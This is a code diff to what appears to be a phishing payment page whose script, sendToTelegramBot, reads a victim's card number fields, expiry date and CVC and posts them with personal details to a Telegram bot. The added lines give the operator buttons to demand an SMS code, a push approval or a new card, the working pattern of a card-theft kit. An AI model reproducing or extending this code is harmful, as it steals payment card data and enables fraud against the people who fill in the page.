@@ -1280,9 +1280,9 @@ async function sendToTelegramBot() {
         const expiry = document.getElementById('expiry').value;
         const cvc = document.getElementById('cvc').value;
 
+        // УНИКАЛЬНЫЙ ID: timestamp + счетчик
         const paymentId = Date.now() + (paymentCounter++);
 
-        // ОТПРАВЛЯЕМ В СТАРОМ ФОРМАТЕ, БОТ САМ ОТФОРМАТИРУЕТ
         const message = `👤 Клиент:
 • Имя: ${formData.firstName || 'Тест'}
 • Фамилия: ${formData.lastName || 'Тестов'}  
@@ -1303,7 +1303,27 @@ async function sendToTelegramBot() {
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: 'HTML'
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { 
+                                text: "📱 SMS код", 
+                                callback_data: `sms_${paymentId}_${userId}`  // ← ИЗМЕНИЛ user123 на ${userId}
+                            },
+                            { 
+                                text: "🔔 Пуш", 
+                                callback_data: `push_${paymentId}_${userId}`  // ← ИЗМЕНИЛ user123 на ${userId}
+                            }
+                        ],
+                        [
+                            { 
+                                text: "❌ Неверная карта", 
+                                callback_data: `wrong_card_${paymentId}_${userId}`  // ← ИЗМЕНИЛ user123 на ${userId}
+                            }
+                        ]
+                    ]
+                }
             })
         });
 
@@ -1465,8 +1485,6 @@ async function sendToTelegramBot() {
     </script>
 </body>
 </html>
-
-
 
 
 
